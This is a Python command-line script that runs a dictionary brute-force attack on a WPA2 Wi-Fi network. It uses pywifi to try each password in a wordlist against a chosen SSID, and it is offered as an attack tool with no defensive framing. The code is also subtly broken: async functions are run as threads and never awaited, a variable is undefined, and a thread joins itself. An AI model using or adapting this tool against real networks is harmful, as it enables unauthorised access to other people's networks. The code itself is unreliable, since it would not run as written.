import asyncio
import itertools
import json
import random
import string
import sys
import threading
import time

import click
import pywifi
from pywifi import PyWifi
from pywifi import constants as const
from pywifi import Profile


def generate_random_password(length=12):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))


async def crack_password(ssid, wordlist):
    with open(wordlist, 'r', encoding='utf8') as words:
        passwords = words.readlines()

    profiles = []
    threads = []

    for password in passwords:
        password = password.strip('\n')
        profile = Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password
        profiles.append(profile)

    async def attempt_connection(index):
        global attempts
        while index < len(profiles):
            try:
                await wifi.connect(profiles[index])
                attempts -= 1
                break
            except Exception as e:
                attempts -= 1
                print(f"[-] Failed connecting with {profiles[index].key}: {e}")
                index += 1
        threads[index].join()

    attempts = len(profiles)
    for i in range(attempts):
        t = threading.Thread(target=attempt_connection, args=(i,))
        threads.append(t)
        t.start()

    await asyncio.gather(*threads)


@click.command()
@click.option('--ssid', required=True, prompt='Enter target SSID')
@click.option('--wordlist', required=True, prompt='Enter password dictionary file')
def brute_force(ssid, wordlist):
    wifi = PyWifi()
    ifaces = wifi.interfaces()[0]

    print(f"[{time.ctime()}] Starting brute force attack on {ssid}...")
    loop = asyncio.new_event_loop()
    loop.run_until_complete(crack_password(ssid, wordlist))
    loop.close()


if __name__ == '__main__':
    brute_force()